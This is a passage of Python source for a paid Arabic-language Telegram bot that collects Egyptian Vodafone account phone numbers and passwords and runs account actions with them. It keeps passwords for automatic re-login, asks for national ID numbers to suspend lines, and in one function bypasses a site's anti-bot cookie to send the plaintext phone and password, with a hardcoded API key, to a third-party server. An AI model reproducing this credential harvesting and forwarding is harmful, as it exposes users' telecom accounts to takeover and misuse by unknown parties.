    "user_sessions": user_sessions  # ربط بقاموس الجلسات
}

# ==================== دوال التحقق من الاشتراك ====================
def check_subscription(user_id):
    if user_id in ADMINS:
        return True, []
    
    not_subscribed = []
    for channel in CHANNELS:
        try:
            status = user_bot.get_chat_member(channel['chat_id'], user_id).status
            if status in ['left', 'kicked']:
                not_subscribed.append(channel)
        except:
            not_subscribed.append(channel)
    
    return len(not_subscribed) == 0, not_subscribed

def subscription_markup(not_subscribed):
    markup = types.InlineKeyboardMarkup(row_width=1)
    for channel in not_subscribed:
        btn = types.InlineKeyboardButton(
            text=f"📢 الاشتراك في {channel['name']}",
            url=channel['link']
        )
        markup.add(btn)
    
    check_btn = types.InlineKeyboardButton(
        text="✅ تحقق من الاشتراك",
        callback_data="check_subscription"
    )
    markup.add(check_btn)
    return markup

def send_subscription_required(chat_id, user_id):
    """إرسال رسالة طلب الاشتراك"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💳 اشترك الآن", callback_data="subscribe_now"),
        types.InlineKeyboardButton(f"📞 تواصل مع المطور", url=f"https://t.me/{DEV_USERNAME[1:]}?start={user_id}")
    )
    user_bot.send_message(
        chat_id,
        f"🔒 *يجب الاشتراك في البوت أولاً*\n\n"
        f"💎 سعر الاشتراك: *{SUBSCRIPTION_PRICE} جنيه / شهر*\n\n"
        f"للاشتراك اضغط على الزر أدناه واتبع التعليمات 👇",
        parse_mode='Markdown',
        reply_markup=markup
    )

def send_subscription_instructions(chat_id, user_id):
    """إرسال تعليمات الاشتراك"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ لقد حولت المبلغ", callback_data="sub_transferred"))
    user_bot.send_message(
        chat_id,
        f"💳 *خطوات الاشتراك في البوت*\n\n"
        f"1️⃣ حوّل مبلغ *{SUBSCRIPTION_PRICE} جنيه* عبر فودافون كاش إلى الرقم:\n"
        f"📱 `{VODAFONE_CASH_NUMBER}`\n\n"
        f"2️⃣ بعد التحويل اضغط على الزر أدناه ✅\n\n"
        f"⚠️ تأكد من التحويل قبل الضغط",
        parse_mode='Markdown',
        reply_markup=markup
    )

# ==================== دوال تسجيل الدخول ====================
def login_process(message, user_id, first_name):
    """بداية عملية تسجيل الدخول"""
    if user_id in user_sessions:
        del user_sessions[user_id]
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    
    bot_status['user_data'][user_id] = {
        'action': 'login_waiting_phone',
        'first_name': first_name
    }
    
    login_message = f"""👋 مرحباً {first_name} !

يرجى تسجيل الدخول بحساب أنا فودافون.

📱 من فضلك أدخل رقم الهاتف:"""
    
    user_bot.send_message(
        user_id,
        login_message,
        parse_mode='Markdown'
    )

def handle_login(message, user_id):
    """معالجة عملية تسجيل الدخول"""
    user_data = bot_status['user_data'].get(user_id, {})
    action = user_data.get('action', '')
    
    if action == 'login_waiting_phone':
        phone = message.text.strip()
        phone = re.sub(r'[^0-9]', '', phone)
        
        if len(phone) not in [10, 11]:
            user_bot.send_message(
                user_id,
                f"{EMOJI['error']} *رقم غير صحيح!*\nيرجى إرسال رقم مكون من 10 أو 11 رقم (مثال: 01001234567):",
                parse_mode='Markdown'
            )
            return
        
        # ✅ التحقق من وجود باسورد محفوظ لهذا الرقم أولاً
        saved = get_saved_password(user_id)
        if saved and saved.get('phone') == phone:
            first_name = user_data.get('first_name', 'المستخدم')
            user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تسجيل الدخول تلقائياً...*", parse_mode='Markdown')
            auth_result = get_authorization(phone, saved['password'])
            if auth_result['success']:
                token = auth_result['token']
                bearer_token = auth_result['bearer_token']
                create_session(user_id, phone, saved['password'], token, bearer_token)
                welcome_text = get_welcome_dashboard(first_name, phone, saved['password'], bearer_token)
                if user_id in bot_status['user_data']:
                    del bot_status['user_data'][user_id]
                user_bot.send_message(
                    user_id,
                    f"🔓 *تم تسجيل الدخول تلقائياً*\n📱 الرقم: `{phone}`\n\n{welcome_text}",
                    parse_mode='Markdown',
                    reply_markup=main_menu_markup()
                )
                return
            else:
                # الباسورد منتهي أو تغير - اطلب باسورد جديد
                clear_saved_password(user_id)
                user_bot.send_message(
                    user_id,
                    f"{EMOJI['error']} *انتهت صلاحية الجلسة المحفوظة*\n\n🔐 من فضلك أدخل كلمة المرور:",
                    parse_mode='Markdown'
                )
                bot_status['user_data'][user_id]['phone'] = phone
                bot_status['user_data'][user_id]['action'] = 'login_waiting_password'
                return

        # التحقق من وجود جلسة سابقة لهذا الرقم
        existing_session = get_session_by_phone(phone)
        
        if existing_session:
            # توجد جلسة سابقة صالحة
            user_bot.send_message(
                user_id,
                f"{EMOJI['info']} *جاري تسجيل الدخول...*",
                parse_mode='Markdown'
            )
            
            # تجديد التوكن
            success, new_bearer = refresh_phone_token_if_needed(phone)
            
            if success and new_bearer:
                new_token = new_bearer.replace("Bearer ", "")
                # إنشاء جلسة للمستخدم الحالي بناءً على الجلسة السابقة
                create_session(user_id, phone, existing_session['password'], new_token, new_bearer)
                
                first_name = user_data.get('first_name', 'المستخدم')
                welcome_text = get_welcome_dashboard(first_name, phone, existing_session['password'], new_bearer)
                
                user_bot.send_message(
                    user_id,
                    welcome_text,
                    parse_mode='Markdown',
                    reply_markup=main_menu_markup()
                )
                
                del bot_status['user_data'][user_id]
                return
            else:
                user_bot.send_message(
                    user_id,
                    f"{EMOJI['error']} *فشل تجديد الجلسة*\nيرجى إدخال كلمة المرور:",
                    parse_mode='Markdown'
                )
                bot_status['user_data'][user_id]['phone'] = phone
                bot_status['user_data'][user_id]['action'] = 'login_waiting_password'
                return
        
        # لا توجد جلسة سابقة
        bot_status['user_data'][user_id]['phone'] = phone
        bot_status['user_data'][user_id]['action'] = 'login_waiting_password'
        
        user_bot.send_message(
            user_id,
            f"🔐 من فضلك أدخل كلمة المرور:",
            parse_mode='Markdown'
        )
    
    elif action == 'login_waiting_password':
        password = message.text.strip()
        if not password:
            user_bot.send_message(
                user_id,
                f"{EMOJI['error']} *كلمة المرور لا يمكن أن تكون فارغة!*\nيرجى إدخال كلمة المرور:",
                parse_mode='Markdown'
            )
            return
        
        phone = bot_status['user_data'][user_id].get('phone')
        first_name = bot_status['user_data'][user_id].get('first_name', 'المستخدم')
        
        user_bot.send_message(
            user_id,
            f"{EMOJI['info']} *جاري تسجيل الدخول...*",
            parse_mode='Markdown'
        )
        
        auth_result = get_authorization(phone, password)
        
        if auth_result['success']:
            token = auth_result['token']
            bearer_token = auth_result['bearer_token']
            create_session(user_id, phone, password, token, bearer_token)
            # حفظ الباسورد لمدة 24 ساعة للدخول التلقائي
            save_password_for_user(user_id, phone, password)
            
            del bot_status['user_data'][user_id]
            
            welcome_text = get_welcome_dashboard(first_name, phone, password, bearer_token)
            
            user_bot.send_message(
                user_id,
                welcome_text,
                parse_mode='Markdown',
                reply_markup=main_menu_markup()
            )
        else:
            user_bot.send_message(
                user_id,
                f"{EMOJI['error']} *فشل تسجيل الدخول!*\n\n{auth_result['message']}\n\nللمحاولة مرة أخرى أرسل /start",
                parse_mode='Markdown'
            )
            del bot_status['user_data'][user_id]

def is_logged_in(user_id):
    """التحقق من أن المستخدم قام بتسجيل الدخول وتجديد الجلسة إذا لزم الأمر"""
    if user_id not in user_sessions:
        return False, None
    
    # التحقق من صلاحية الجلسة وتجديدها
    session_valid = check_and_refresh_user_session(user_id)
    
    if not session_valid:
        # حذف الجلسة منتهية الصلاحية
        if user_id in user_sessions:
            del user_sessions[user_id]
        return False, None
    
    return True, user_sessions[user_id]

# ==================== دوال المارك اب ====================
def main_menu_markup():
    """إنشاء لوحة مفاتيح سفلية للقائمة الرئيسية - تحتوي على أزرار الأقسام فقط بعد تسجيل الدخول"""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    sections = db.get_level1_items()
    
    buttons = [types.KeyboardButton(text=display_name) for section_id, display_name, emoji, is_active in sections]
    
    # كل زرارين في صف أفقي
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            markup.row(buttons[i], buttons[i + 1])
        else:
            markup.row(buttons[i])
    
    # زر تسجيل الخروج
    markup.row(types.KeyboardButton(text="🚪 تسجيل الخروج"))
    
    return markup

def level2_markup(parent_id, parent_name):
    """إنشاء لوحة مفاتيح سفلية ثابتة للمستوى الثاني - تحتوي على أزرار الخدمات وزر الرجوع"""
    buttons = db.get_level2_items(parent_id)
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_list = [types.KeyboardButton(text=display_name)
                for button_id, display_name, emoji, is_active in buttons]
    
    # كل زرارين في صف أفقي
    for i in range(0, len(btn_list), 2):
        if i + 1 < len(btn_list):
            markup.row(btn_list[i], btn_list[i + 1])
        else:
            markup.row(btn_list[i])
    
    # زر الرجوع للقائمة الرئيسية
    markup.row(types.KeyboardButton(text=f"{EMOJI['back']} الرجوع للقائمة الرئيسية"))
    
    return markup

def level3_markup(parent_id, parent_name):
    """إنشاء لوحة مفاتيح سفلية ثابتة للمستوى الثالث - تحتوي على أزرار الخدمات الفرعية وزر الرجوع"""
    sub_buttons = db.get_level3_items(parent_id)
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_list = [types.KeyboardButton(text=display_name)
                for sub_id, display_name, emoji, content, is_active in sub_buttons]
    
    # كل زرارين في صف أفقي
    for i in range(0, len(btn_list), 2):
        if i + 1 < len(btn_list):
            markup.row(btn_list[i], btn_list[i + 1])
        else:
            markup.row(btn_list[i])
    
    # زر الرجوع للقائمة السابقة
    markup.row(types.KeyboardButton(text=f"{EMOJI['back']} الرجوع للقائمة السابقة"))
    
    return markup

def get_percentage_markup():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("10%", callback_data="percent_10"))
    markup.add(types.InlineKeyboardButton("20%", callback_data="percent_20"))
    markup.add(types.InlineKeyboardButton("40%", callback_data="percent_40"))
    markup.add(types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action"))
    return markup

# ==================== دوال الخدمات باستخدام الجلسة ====================

def handle_line_data_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'line_data_confirm',
        'phone': session['phone'],
        'password': session['password']
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد", callback_data="line_data_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['line_data']} *بيانات الخط*\n\n📱 الرقم: `{session['phone']}`\n\nهل تريد عرض بيانات الخط؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_due_balance_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'due_balance_confirm',
        'phone': session['phone'],
        'password': session['password']
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد", callback_data="due_balance_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['due_balance']} *الرصيد المستحق*\n\n📱 الرقم: `{session['phone']}`\n\nهل تريد عرض الرصيد المستحق؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_stop_line_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'stop_line_waiting_national',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['stop_line']} *إيقاف الخط*\n\n📱 الرقم المسجل: `{session['phone']}`\n\n📋 *أدخل الرقم القومي:*",
        parse_mode='Markdown'
    )

def handle_stop_line_national(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'stop_line_waiting_national':
        return
    
    national_id = message.text.strip()
    if not national_id or len(national_id) < 14:
        user_bot.send_message(user_id, f"{EMOJI['error']} *الرقم القومي غير صحيح!*", parse_mode='Markdown')
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري إيقاف الخط...*", parse_mode='Markdown')
    
    success, message = run_stop_line(phone, password, national_id)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم إيقاف الخط بنجاح*\n\n{message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل إيقاف الخط*\n\n{message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_flex_bundles_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'flex_waiting_bundle',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['flex']} *اختر الباقة المناسبة:*",
        parse_mode='Markdown',
        reply_markup=show_flex_bundles_markup()
    )

def handle_rahatabalk_egjbary_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    # تخزين البيانات وعرض تأكيد
    bot_status['user_data'][user_id] = {
        'action': 'rahatabalk_confirm',
        'phone': phone,
        'password': password
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد التنفيذ", callback_data="rahatabalk_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['rahatabalk_egjbary']} *ريح بالك اجباري*\n\n📱 الرقم: `{phone}`\n\n⚠️ هل تريد تنفيذ ريح بالك اجباري على هذا الرقم؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def execute_rahatabalk_egjbary(call, user_id):
    """تنفيذ ريح بالك اجباري بعد التأكيد - باستخدام API جديد"""
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'rahatabalk_confirm':
        user_bot.answer_callback_query(call.id, "البيانات انتهت صلاحيتها")
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    
    user_bot.answer_callback_query(call.id, "جاري التنفيذ...")
    msg = user_bot.send_message(user_id, f"{EMOJI['rahatabalk_egjbary']} *جاري تنفيذ ريح بالك اجباري...*\n\n⏳ انتظر لحظة...", parse_mode='Markdown')
    
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
    
    try:
        # ===== API الجديد =====
        API_URL = "https://moapp.great-site.net/api/voda_14"
        KEY = "e120685c4dabc9340b84a66acd3631e0"
        HEADERS = {"User-Agent": "Mozilla/5.0"}
        
        FAIL_WORDS = ("fail", "error", "invalid", "خطأ", "فشل", "غلط",
                      "incorrect", "wrong", "denied", "not found", "مش")
        
        session = requests.Session()
        
        # ── خطوة 1: جلب صفحة الحماية وحل الـ AES cookie
        r0 = session.get(API_URL, headers=HEADERS, timeout=15)
        
        if "toNumbers" in r0.text:
            try:
                from Crypto.Cipher import AES as _AES
                import re as _re
                a_val = _re.search(r'a=toNumbers\("([^"]+)"\)', r0.text).group(1)
                b_val = _re.search(r'b=toNumbers\("([^"]+)"\)', r0.text).group(1)
                c_val = _re.search(r'c=toNumbers\("([^"]+)"\)', r0.text).group(1)
                cipher = _AES.new(
                    bytes.fromhex(a_val),
                    _AES.MODE_CBC,
                    bytes.fromhex(b_val)
                )
                test_cookie = cipher.decrypt(bytes.fromhex(c_val)).hex()
                session.cookies.set("__test", test_cookie, domain="moapp.great-site.net")
            except ImportError:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *خطأ في المكتبات*\n\n"
                    f"❌ pycryptodome غير مثبت\n\n"
                    f"⚠️ قم بتثبيته: `pip install pycryptodome`",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            except Exception as _e:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل حل الحماية*\n\n"
                    f"❌ {str(_e)[:100]}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
        
        # ── خطوة 2: الطلب الحقيقي
        r = session.get(
            API_URL,
            params={"key": KEY, "number": phone, "password": password, "i": "1"},
            headers=HEADERS,
            timeout=25,
        )
        
        raw = r.text.strip()
        
        if r.status_code != 200:
            user_bot.edit_message_text(
                f"{EMOJI['error']} *فشل الاتصال بالسيرفر*\n\n"
                f"❌ كود {r.status_code}: {raw[:150]}",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return
        
        # ── محاولة parse JSON
        try:
            import json
            data = json.loads(raw)
            
            # ✅ لو الـ API رجع success: true → نجاح
            if data.get("success") is True:
                user_bot.edit_message_text(
                    f"{EMOJI['success']} *تم تنفيذ ريح بالك اجباري بنجاح!* 😮‍💨\n\n"
                    f"✅ تم تحويل الخط بنجاح\n\n"
                    f"📱 الرقم: `{phone}`",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            # ❌ لو success: false → فشل
            if data.get("success") is False:
                error_msg = (data.get("reason") or data.get("message") or 
                           data.get("error") or str(data)[:200])
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ {error_msg}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            # ── fallback: بص على النص لو مفيش success key
            txt = str(data).lower()
            if any(k in txt for k in FAIL_WORDS):
                error_msg = (data.get("reason") or data.get("message") or 
                           data.get("error") or str(data)[:200])
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ {error_msg}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            # نجاح بدون success key واضح
            user_bot.edit_message_text(
                f"{EMOJI['success']} *تم تنفيذ ريح بالك اجباري بنجاح!* 😮‍💨\n\n"
                f"✅ تم تحويل الخط بنجاح\n\n"
                f"📱 الرقم: `{phone}`",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return
            
        except Exception as e:
            # رد نصي مش JSON
            raw_lower = raw.lower()
            if any(k in raw_lower for k in FAIL_WORDS):
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ {raw[:200]}",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            if not raw:
                user_bot.edit_message_text(
                    f"{EMOJI['error']} *فشل تنفيذ ريح بالك اجباري*\n\n"
                    f"❌ السيرفر رجع رد فاضي",
                    msg.chat.id, msg.message_id, parse_mode='Markdown'
                )
                return
            
            # نجاح بنص عادي
            user_bot.edit_message_text(
                f"{EMOJI['success']} *تم تنفيذ ريح بالك اجباري بنجاح!* 😮‍💨\n\n"
                f"✅ تم تحويل الخط بنجاح\n\n"
                f"📱 الرقم: `{phone}`",
                msg.chat.id, msg.message_id, parse_mode='Markdown'
            )
            return
            
    except Exception as e:
        user_bot.edit_message_text(
            f"{EMOJI['error']} *حدث خطأ أثناء التنفيذ*\n\n"
            f"❌ {str(e)[:100]}",
            msg.chat.id, msg.message_id, parse_mode='Markdown'
        )

def handle_offers_365_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب العروض...*", parse_mode='Markdown')
    
    success, message, offers = run_offers_365(phone, password)
    
    if not success or not offers:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب العروض!*\n{message}", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'offers': offers,
        'phone': phone,
        'password': password,
        'action': 'offers_365_waiting_selection'
    }
    
    offers_text = f"{EMOJI['offers_365']} *العروض المتاحة*\n\n"
    for offer in offers:
        offers_text += f"{offer['index']}. {offer['description']}\n"
        if offer['discounted_price'] > 0:
            if offer['original_price'] > 0 and offer['discounted_price'] != offer['original_price']:
                offers_text += f"   💰 السعر: {offer['discounted_price']} ج (بدل {offer['original_price']} ج)\n"
            else:
                offers_text += f"   💰 السعر: {offer['discounted_price']} ج\n"
        if offer['quota'] > 0:
            offers_text += f"   📊 الحجم: {offer['quota']:,.0f} ميجا\n"
        offers_text += "\n"
    
    offers_text += f"{EMOJI['info']} *أرسل رقم العرض الذي تريد تفعيله (مثال: 1)*"
    user_bot.send_message(user_id, offers_text, parse_mode='Markdown')

def handle_offers_365_selection(message, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'offers_365_waiting_selection':
        return
    
    try:
        selection = int(message.text.strip())
        offers = user_data.get('offers', [])
        
        selected_offer = None
        for offer in offers:
            if offer['index'] == selection:
                selected_offer = offer
                break
        
        if not selected_offer:
            user_bot.send_message(user_id, f"{EMOJI['error']} *رقم عرض غير صحيح!*", parse_mode='Markdown')
            return
        
        phone = user_data.get('phone')
        password = user_data.get('password')
        
        user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل العرض...*", parse_mode='Markdown')
        
        success, message = run_subscribe_offer(phone, password, selected_offer['offer_id'])
        
        if success:
            user_bot.send_message(user_id, f"{EMOJI['success']} *تم تفعيل العرض بنجاح!*\n\n{selected_offer['description']}", parse_mode='Markdown')
        else:
            user_bot.send_message(user_id, f"{EMOJI['error']} *فشل التفعيل!*\n{message}", parse_mode='Markdown')
        
        del bot_status['user_data'][user_id]
    except ValueError:
        user_bot.send_message(user_id, f"{EMOJI['error']} *يرجى إرسال رقم العرض (مثال: 1)*", parse_mode='Markdown')

def handle_renew_bundle_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'renew_bundle_confirm',
        'phone': session['phone'],
        'password': session['password']
    }
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد التجديد", callback_data="renew_bundle_confirm"),
        types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_action")
    )
    user_bot.send_message(
        user_id,
        f"{EMOJI['renew']} *تجديد الباقة تلقائياً*\n\n📱 الرقم: `{session['phone']}`\n\nهل تريد تجديد باقتك الحالية؟",
        parse_mode='Markdown',
        reply_markup=markup
    )

def handle_next_month_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب عرض MI...*", parse_mode='Markdown')
    
    success, message, offer = run_mi_offer(phone, password)
    
    if not success or not offer:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب العرض!*\n{message}", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'offer': offer,
        'phone': phone,
        'password': password,
        'action': 'next_month_waiting_confirm'
    }
    
    offer_text = f"{EMOJI['next_month']} *عرض النت (الشهر الثاني)*\n\n"
    offer_text += f"📦 اسم العرض: {offer['id']}\n"
    offer_text += f"💰 المبلغ المطلوب: {offer['price_info'].get('amountToPay', 'غير محدد')} جنيه\n"
    if 'discount' in offer['price_info']:
        offer_text += f"🎁 قيمة الخصم: {offer['price_info']['discount']} جنيه\n"
    offer_text += f"💎 قيمة الباقة: {offer['price_info'].get('bundleFees', 'غير محدد')} جنيه\n"
    if offer['renewal_date']:
        offer_text += f"📅 تاريخ التجديد: {offer['renewal_date']}\n"
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("✅ نعم، تفعيل", callback_data="confirm_mi_activate"))
    markup.add(types.InlineKeyboardButton(f"{EMOJI['cancel']} إلغاء", callback_data="cancel_mi_activate"))
    
    user_bot.send_message(user_id, offer_text, parse_mode='Markdown', reply_markup=markup)

def handle_next_month_confirm(call, user_id):
    user_data = bot_status['user_data'].get(user_id, {})
    if user_data.get('action') != 'next_month_waiting_confirm':
        return
    
    phone = user_data.get('phone')
    password = user_data.get('password')
    offer = user_data.get('offer')
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل العرض...*", parse_mode='Markdown')
    
    success, message = run_activate_mi(phone, password, offer)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم تفعيل العرض بنجاح!*\n\n{message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل التفعيل!*\n{message}", parse_mode='Markdown')
    
    del bot_status['user_data'][user_id]

def handle_report_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري تفعيل خدمة المكالمات التوثيقية...*", parse_mode='Markdown')
    
    success, message = run_verification_service(phone, password)
    
    if success:
        user_bot.send_message(user_id, f"{EMOJI['success']} *تم تفعيل الخدمة بنجاح!*\n\n{message}", parse_mode='Markdown')
    else:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل التفعيل!*\n{message}", parse_mode='Markdown')

def handle_note_packages_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'action': 'note_waiting_package',
        'phone': session['phone'],
        'password': session['password']
    }
    user_bot.send_message(
        user_id,
        f"{EMOJI['note_packages']} *اختر الباقة المناسبة:*",
        parse_mode='Markdown',
        reply_markup=show_note_packages_markup()
    )

def handle_plus_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
        user_bot.send_message(user_id, f"{EMOJI['error']} *أنت غير مسجل الدخول!*\n\nيرجى تسجيل الدخول أولاً باستخدام /start", parse_mode='Markdown')
        return
    
    phone = session['phone']
    password = session['password']
    
    user_bot.send_message(user_id, f"{EMOJI['info']} *جاري جلب باقات Plus...*", parse_mode='Markdown')
    
    auth_result = plus_login(phone, password)
    if not auth_result['success']:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل تسجيل الدخول!*", parse_mode='Markdown')
        return
    
    token = auth_result['token']
    data = get_plus_packages(token, phone)
    if not data:
        user_bot.send_message(user_id, f"{EMOJI['error']} *فشل جلب الباقات!*", parse_mode='Markdown')
        return
    
    packages = parse_plus_packages(data)
    if not packages:
        user_bot.send_message(user_id, f"{EMOJI['error']} *لا توجد باقات Plus متاحة*", parse_mode='Markdown')
        return
    
    bot_status['user_data'][user_id] = {
        'packages': packages,
        'token': token,
        'phone': phone,
        'action': 'plus_waiting_bundle'
    }
    
    user_bot.send_message(
        user_id,
        f"{EMOJI['plus']} *اختر الباقة المناسبة:*",
        parse_mode='Markdown',
        reply_markup=show_plus_packages_markup(packages)
    )

def handle_extreme_service(user_id):
    # إلغاء أي عملية سابقة
    if user_id in bot_status['user_data']:
        del bot_status['user_data'][user_id]
        
    logged_in, session = is_logged_in(user_id)
    if not logged_in:
